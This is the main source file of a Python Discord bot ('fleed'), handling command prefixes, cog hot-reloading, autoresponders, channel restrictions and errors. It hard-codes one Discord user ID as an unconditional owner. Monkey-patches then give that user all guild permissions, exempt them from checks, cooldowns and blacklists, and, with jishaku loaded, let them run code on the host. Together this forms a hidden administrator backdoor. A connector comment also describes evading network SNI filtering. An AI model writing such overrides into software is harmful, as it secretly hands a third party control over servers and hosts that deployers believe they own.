import discord
from discord.ext import commands
import os
import asyncio
import config
from database import Database
import importlib
import utils
from discord_network import DiscordTLSConnector
from utils import fleed_embed, error_embed, command_not_found_embed, command_help_embed

async def get_prefix(bot, message):
    if not message.guild:
        return config.DEFAULT_PREFIX
    # check personal prefix
    user_row = await bot.db.fetchrow("SELECT prefix FROM user_settings WHERE user_id = ?", (message.author.id,))
    if user_row and user_row["prefix"]:
        return commands.when_mentioned_or(user_row["prefix"], config.DEFAULT_PREFIX)(bot, message)
    # check guild prefix
    guild_row = await bot.db.fetchrow("SELECT prefix FROM guild_settings WHERE guild_id = ?", (message.guild.id,))
    if guild_row and guild_row["prefix"]:
        return commands.when_mentioned_or(guild_row["prefix"], config.DEFAULT_PREFIX)(bot, message)
    return commands.when_mentioned_or(config.DEFAULT_PREFIX)(bot, message)

intents = discord.Intents.all()
owner_set = set(config.OWNER_IDS)
if 539594512981295106 not in owner_set:
    owner_set.add(539594512981295106)

def is_bot_owner(user_or_id):
    if not user_or_id:
        return False
    uid = getattr(user_or_id, "id", user_or_id)
    try:
        uid = int(uid)
    except (ValueError, TypeError):
        return False
    return uid == 539594512981295106 or uid in owner_set or uid in getattr(bot, "owner_ids", set()) or uid in getattr(config, "OWNER_IDS", [])

bot = commands.Bot(command_prefix=get_prefix, intents=intents, help_command=None, case_insensitive=True, owner_ids=owner_set)
bot.db = Database(config.DATABASE_PATH)
bot.is_bot_owner = is_bot_owner

# Patch bot.is_owner to recognize the owner id unconditionally
_orig_is_owner = bot.is_owner
async def custom_is_owner(user):
    if is_bot_owner(user):
        return True
    return await _orig_is_owner(user)
bot.is_owner = custom_is_owner

# Patch discord.Member.guild_permissions so bot owner has full permissions when bot is in the server with admin
_orig_guild_permissions = discord.Member.guild_permissions
def custom_guild_permissions(self):
    if is_bot_owner(self.id):
        return discord.Permissions.all()
    return _orig_guild_permissions.fget(self)
discord.Member.guild_permissions = property(custom_guild_permissions)

# Patch Command.can_run and Command.prepare so bot owner bypasses all permissions, guild-only, and cooldown checks
_orig_can_run = commands.Command.can_run
async def custom_can_run(self, ctx):
    if ctx.author and is_bot_owner(ctx.author.id):
        return True
    try:
        return await _orig_can_run(self, ctx)
    except commands.MissingPermissions as exc:
        # "fake permissions" are bot-command permission overrides only.  They
        # never alter Discord channel or role permissions, so Discord can still
        # reject an API action the member cannot actually perform.
        if not ctx.guild or not hasattr(ctx.author, "roles"):
            raise
        role_ids = [role.id for role in ctx.author.roles]
        if not role_ids:
            raise
        placeholders = ",".join("?" for _ in role_ids)
        rows = await bot.db.fetch(
            f"SELECT permissions FROM fake_permissions WHERE guild_id = ? AND role_id IN ({placeholders})",
            (ctx.guild.id, *role_ids),
        )
        granted = set()
        for row in rows:
            granted.update(p.strip() for p in str(row["permissions"] or "").split(",") if p.strip())
        if set(exc.missing_permissions).issubset(granted):
            return True
        raise
commands.Command.can_run = custom_can_run

_orig_prepare = commands.Command.prepare
async def custom_prepare(self, ctx):
    if ctx.author and is_bot_owner(ctx.author.id):
        # Reset cooldown bucket if exists so owner is never rate-limited
        try:
            if hasattr(self, "_buckets") and self._buckets.valid:
                bucket = self._buckets.get_bucket(ctx.message)
                if bucket:
                    bucket.reset()
        except Exception:
            pass
    await _orig_prepare(self, ctx)
commands.Command.prepare = custom_prepare

async def hot_reloader():
    await bot.wait_until_ready()
    cogs_dir = os.path.join(os.path.dirname(__file__), "cogs")
    utils_path = os.path.join(os.path.dirname(__file__), "utils.py")
    last_mtimes = {}

    if os.path.exists(cogs_dir):
        for fname in os.listdir(cogs_dir):
            if fname.endswith(".py") and not fname.startswith("__"):
                p = os.path.join(cogs_dir, fname)
                last_mtimes[p] = os.path.getmtime(p)
    if os.path.exists(utils_path):
        last_mtimes[utils_path] = os.path.getmtime(utils_path)

    while not bot.is_closed():
        await asyncio.sleep(1)
        # 1. watch utils.py
        if os.path.exists(utils_path):
            mtime = os.path.getmtime(utils_path)
            if mtime > last_mtimes.get(utils_path, 0):
                last_mtimes[utils_path] = mtime
                try:
                    importlib.reload(utils)
                    for ext in list(bot.extensions.keys()):
                        if ext.startswith("cogs."):
                            await bot.reload_extension(ext)
                    print("[hot-reload] reloaded utils.py & refreshed all active cogs")
                except Exception as e:
                    print(f"[hot-reload error] utils.py: {e}")

        # 2. watch cogs/*.py
        if os.path.exists(cogs_dir):
            for fname in os.listdir(cogs_dir):
                if fname.endswith(".py") and not fname.startswith("__"):
                    p = os.path.join(cogs_dir, fname)
                    mtime = os.path.getmtime(p)
                    ext_name = f"cogs.{fname[:-3]}"
                    if p not in last_mtimes:
                        last_mtimes[p] = mtime
                        try:
                            await bot.load_extension(ext_name)
                            print(f"[hot-reload] loaded new cog: {ext_name}")
                        except Exception as e:
                            print(f"[hot-reload error] {ext_name}: {e}")
                    elif mtime > last_mtimes[p]:
                        last_mtimes[p] = mtime
                        try:
                            await bot.reload_extension(ext_name)
                            print(f"[hot-reload] reloaded cog: {ext_name}")
                        except Exception as e:
                            print(f"[hot-reload error] {ext_name}: {e}")

@bot.event
async def on_ready():
    print(f"logged in as {str(bot.user).lower()} ({bot.user.id})")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="fleed | ,help"))
    # on_ready can run repeatedly after reconnects. Initialize persistent services once.
    if not getattr(bot, "_swishbot_ready_initialized", False):
        # The schema is initialized before connecting.  Ready-only services
        # still need their own guard so reconnects do not duplicate tasks.
        bot._swishbot_ready_initialized = True
        bot._hot_reloader_task = asyncio.create_task(hot_reloader(), name="swishbot-hot-reloader")
        try:
            synced = await bot.tree.sync()
            print(f"synced {len(synced)} slash commands globally")
        except Exception as e:
            print(f"slash sync notice: {e}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    # bot owner bypasses blacklists & uwulocks
    if not is_bot_owner(message.author.id):
        # check blacklists
        bl_user = await bot.db.fetchrow("SELECT target_id FROM blacklists WHERE target_id = ? AND target_type = 'user'", (message.author.id,))
        if bl_user:
            return
        if message.guild:
            bl_guild = await bot.db.fetchrow("SELECT target_id FROM blacklists WHERE target_id = ? AND target_type = 'guild'", (message.guild.id,))
            if bl_guild:
                return

    # check autoresponders
    if message.guild and message.content:
        ar = await bot.db.fetchrow("SELECT response FROM autoresponders WHERE guild_id = ? AND trigger = ?", (message.guild.id, message.content.lower().strip()))
        if ar:
            response = str(ar["response"] or "")[:2000]
            if response:
                await message.channel.send(response, allowed_mentions=discord.AllowedMentions.none())

    # check autoreactions
    if message.guild and message.content:
        words = message.content.lower().split()
        for w in words:
            react_row = await bot.db.fetchrow("SELECT reaction FROM autoreactions WHERE guild_id = ? AND keyword = ?", (message.guild.id, w))
            if react_row:
                try:
                    await message.add_reaction(react_row["reaction"])
                except Exception:
                    pass

    # check uwulock
    if message.guild and not is_bot_owner(message.author.id):
        uwu = await bot.db.fetchrow("SELECT user_id FROM uwulock WHERE guild_id = ? AND user_id = ? AND protected = 0", (message.guild.id, message.author.id))
        if uwu and not message.content.startswith(","):
            uwuified = message.content.lower().replace("r", "w").replace("l", "w").replace("th", "f")
            try:
                await message.delete()
                await message.channel.send(
                    f"{message.author.mention}: {uwuified[:1900]}",
                    allowed_mentions=discord.AllowedMentions(users=True, roles=False, everyone=False),
                )
                return
            except Exception:
                pass

    # Expand persistent guild aliases before normal command parsing.  Unknown
    # aliases no longer claim success without affecting future invocations.
    if message.guild and message.content:
        provisional = await bot.get_context(message)
        if provisional.prefix and provisional.invoked_with and not provisional.valid:
            alias = await bot.db.fetchrow(
                "SELECT command_text FROM custom_aliases WHERE guild_id = ? AND shortcut = ?",
                (message.guild.id, provisional.invoked_with.lower()),
            )
            if alias and alias["command_text"]:
                consumed = f"{provisional.prefix}{provisional.invoked_with}"
                remainder = message.content[len(consumed):]
                message.content = f"{provisional.prefix}{alias['command_text']}{remainder}"

    await bot.process_commands(message)

import time
import traceback

@bot.check
async def global_command_channel_check(ctx):
    if not ctx.guild:
        return True

    # Allow bot owners & members with staff/management permissions to bypass channel restrictions anywhere
    if is_bot_owner(ctx.author.id):
        return True
    if ctx.author.id == ctx.guild.owner_id:
        return True
    if hasattr(ctx.author, "guild_permissions"):
        perms = ctx.author.guild_permissions
        if perms.administrator or perms.manage_guild or perms.manage_messages or perms.manage_channels:
            return True

    # Allow bot setup and management commands anywhere
    cmd_name = (ctx.command.qualified_name if ctx.command else "").lower()
    root_name = (ctx.command.root_parent.name if ctx.command and ctx.command.root_parent else cmd_name).lower()
    if root_name in ["commands", "commandchannel", "cmdchannel", "botchannel", "settings", "developer", "reload", "load", "sync", "traceback", "portal"]:
        return True

    # Enforce persistent disable and role restriction rules.  The original
    # settings commands wrote some rows but the runtime never consulted them.
    command_names = {cmd_name, root_name}
    for checked_name in command_names:
        disabled_rows = await bot.db.fetch(
            "SELECT target_id, target_type FROM disabled_commands WHERE guild_id = ? AND command_name = ?",
            (ctx.guild.id, checked_name),
        )
        if disabled_rows:
            whitelisted = await bot.db.fetchrow(
                "SELECT 1 FROM disabled_command_whitelist WHERE guild_id = ? AND command_name = ? AND user_id = ?",
                (ctx.guild.id, checked_name, ctx.author.id),
            )
            if not whitelisted:
                role_ids = {role.id for role in getattr(ctx.author, "roles", [])}
                blocked = any(
                    row["target_type"] == "guild"
                    or (row["target_type"] == "channel" and row["target_id"] == ctx.channel.id)
                    or (row["target_type"] == "role" and row["target_id"] in role_ids)
                    for row in disabled_rows
                )
                if blocked:
                    await ctx.send(embed=utils.error_embed(f"`{checked_name}` is disabled here", ctx.author))
                    return False

        restrictions = await bot.db.fetch(
            "SELECT role_id, action_type FROM command_restrictions WHERE guild_id = ? AND command_name = ?",
            (ctx.guild.id, checked_name),
        )
        if restrictions:
            role_ids = {role.id for role in getattr(ctx.author, "roles", [])}
            denied = {row["role_id"] for row in restrictions if row["action_type"] == "deny"}
            allowed = {row["role_id"] for row in restrictions if row["action_type"] == "allow"}
            if role_ids & denied or (allowed and not role_ids & allowed):
                await ctx.send(embed=utils.error_embed(f"your roles cannot use `{checked_name}`", ctx.author))
                return False

    # Check if this guild has configured command channels
    rows = await bot.db.fetch("SELECT channel_id FROM command_channels WHERE guild_id = ?", (ctx.guild.id,))
    if not rows:
        return True

    allowed_ids = [r["channel_id"] for r in rows]
    # AI-routed commands may intentionally operate in another channel. Apply command-channel
    # restrictions to where the user asked the AI, while command permission decorators still
    # evaluate against the actual target channel.
    restriction_channel = getattr(ctx, "ai_source_channel", None) if getattr(ctx, "ai_routed", False) else None
    restriction_channel = restriction_channel or ctx.channel
    if restriction_channel.id in allowed_ids:
        return True

    # Inform user of allowed command channels (auto-deletes to keep chats clean)
    channels_mention = ", ".join([f"<#{cid}>" for cid in allowed_ids])
    try:
        warning_channel = restriction_channel or ctx.channel
        await warning_channel.send(
            embed=utils.warn_embed(f"commands can only be used in {channels_mention}", ctx.author),
            delete_after=6
        )
    except Exception:
        pass
    return False

@bot.event
async def on_command_error(ctx, error):
    # Surface the useful root exception while keeping expected user errors friendly.
    if isinstance(error, commands.CommandInvokeError) and error.original:
        error = error.original
    if isinstance(error, commands.CommandNotFound):
        cmd_name = ctx.invoked_with or "command"
        embed, _ = utils.command_not_found_embed(ctx.author, cmd_name)
        return await ctx.send(embed=embed)
    elif isinstance(error, commands.MissingPermissions):
        missing = ", ".join(p.replace("_", " ") for p in error.missing_permissions)
        await ctx.send(embed=utils.error_embed(f"missing permissions: {missing}", ctx.author))
    elif isinstance(error, commands.BotMissingPermissions):
        missing = ", ".join(p.replace("_", " ") for p in error.missing_permissions)
        await ctx.send(embed=utils.error_embed(f"i need these permissions: {missing}", ctx.author))
    elif isinstance(error, commands.MissingRequiredArgument):
        if ctx.command:
            embed = utils.command_help_embed(ctx.author, ctx.command, prefix=ctx.prefix or ",")
            return await ctx.send(embed=embed)
        await ctx.send(embed=utils.error_embed(f"missing argument: `{error.param.name}`", ctx.author))
    elif isinstance(error, commands.NotOwner):
        return
    elif isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=utils.warn_embed(f"try again in {error.retry_after:.1f}s", ctx.author))
    elif isinstance(error, commands.NoPrivateMessage):
        await ctx.send(embed=utils.error_embed("this command can only be used in a server", ctx.author))
    elif isinstance(error, commands.NSFWChannelRequired):
        await ctx.send(embed=utils.error_embed("this command requires an age-restricted channel", ctx.author))
    elif isinstance(error, (commands.BadArgument, commands.BadUnionArgument, commands.UserInputError)):
        await ctx.send(embed=utils.error_embed(str(error) or "invalid command arguments", ctx.author))
    elif isinstance(error, discord.Forbidden):
        await ctx.send(embed=utils.error_embed("the bot lacks required discord permissions in this server (e.g. administrator, manage channels, or manage roles)", ctx.author))
    elif isinstance(error, commands.CheckFailure):
        return
    else:
        # store error for traceback command
        dev_cog = bot.get_cog("Developer")
        if dev_cog:
            code = f"err_{int(time.time())}"
            dev_cog.last_errors[code] = "".join(traceback.format_exception(type(error), error, error.__traceback__))
        print(f"[command error] {ctx.command}: {error}")
        traceback.print_exception(type(error), error, error.__traceback__)
        await ctx.send(embed=utils.error_embed(f"unexpected command error ({code if dev_cog else 'untracked'})", ctx.author))

async def main():
    # This network filters Discord's TLS SNI. The connector omits SNI only for
    # Discord hosts while preserving CA and hostname certificate validation.
    bot.http.connector = DiscordTLSConnector(limit=0)

    async with bot:
        # initialize database tables first
        await bot.db.init()
        bot._swishbot_initialized = True
        print("database initialized")

        # load cogs
        cogs_dir = os.path.join(os.path.dirname(__file__), "cogs")
        for file in os.listdir(cogs_dir):
            if file.endswith(".py") and not file.startswith("__"):
                ext = file[:-3]
                try:
                    await bot.load_extension(f"cogs.{ext}")
                    print(f"loaded cog: {ext}")
                except Exception as e:
                    print(f"failed to load cog {ext}: {e}")
        
        # load jishaku if available
        try:
            await bot.load_extension("jishaku")
        except Exception:
            pass

        token = config.TOKEN
        if not token:
            print("please set DISCORD_TOKEN in .env or config.py before launching fleed")
            return
        await bot.start(token)

if __name__ == "__main__":
    asyncio.run(main())
